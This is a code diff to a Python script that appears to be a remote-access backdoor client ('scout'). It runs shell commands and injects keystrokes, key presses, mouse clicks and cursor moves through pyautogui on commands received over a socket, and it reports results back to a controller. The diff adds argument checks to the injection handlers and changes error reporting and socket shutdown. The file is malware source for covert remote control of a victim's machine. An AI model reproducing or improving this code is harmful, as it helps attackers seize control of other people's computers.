@@ -121,12 +121,21 @@ def shell_execute(execute):
 def inject_input(injection_type, arg):
     try:
         if injection_type == 'ty':
+            if not arg:
+                s.sendall('[-]Supply a key as an arg'+End)
+                return
             pyautogui.typewrite(arg)
             s.sendall('[+]Injected typewritten character/s' + End)
         elif injection_type == 'pr':
+            if not arg:
+                s.sendall('[-]Supply a key as an arg'+End)
+                return
             pyautogui.press(arg)
             s.sendall('[+]Injected pressed key' + End)
         elif injection_type == 'sh':
+            if not arg:
+                s.sendall('[-]Supply a key as an arg'+End)
+                return
             if ' ' in arg:
                 arg = arg.split(' ')
                 for key in arg:
@@ -147,6 +156,9 @@ def inject_input(injection_type, arg):
             pyautogui.click(button='right')
             s.sendall('[+]Injected right mouse click' + End)
         elif injection_type == 'move_to':
+            if not arg:
+                s.sendall('[-]Supply a key as an arg'+End)
+                return
             try:
                 arg = arg.split(' ')
                 cord_one = int(arg[0])
@@ -228,9 +240,14 @@ def main():
                 break
             except Exception as e:
                 try:
-                    s.sendall('[-]Error running command "' + command + '" : ' + str(e) + End)
+                    if command:
+                        s.sendall('[-]Error, last run command : ' + command + '. Error message : ' + str(e) + End)
+                    else:
+                        s.sendall('[-]Error message : ' + str(e) + End)
                 except:
-                    s.sendall('[-]Error with scout : ' + str(e))
+                    s.shutdown(1)
+                    s.close()
+                    break
 
 
 main()
